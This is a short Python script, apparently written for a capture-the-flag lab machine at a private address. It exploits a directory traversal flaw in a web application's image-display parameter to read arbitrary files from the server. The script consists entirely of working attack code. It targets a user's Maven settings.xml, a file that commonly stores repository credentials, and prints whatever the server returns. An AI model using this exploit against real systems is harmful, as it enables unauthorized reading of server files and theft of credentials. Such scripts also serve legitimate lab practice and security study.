import requests
BASE = "http://10.10.11.204:8080/show_image?img=../../../../../../../../../../.."


def fail(msg):
    print(msg)
    exit()


def request_file(file):
    try:
        res = requests.get(BASE + file, timeout=1)
    except requests.exceptions.ConnectionError:
        fail("Missing permisisons")

    if res.status_code != 200:
        fail("Does not exist")

    content = res.content.decode()
    print(content)
    return content


request_file("/home/frank/.m2/settings.xml")
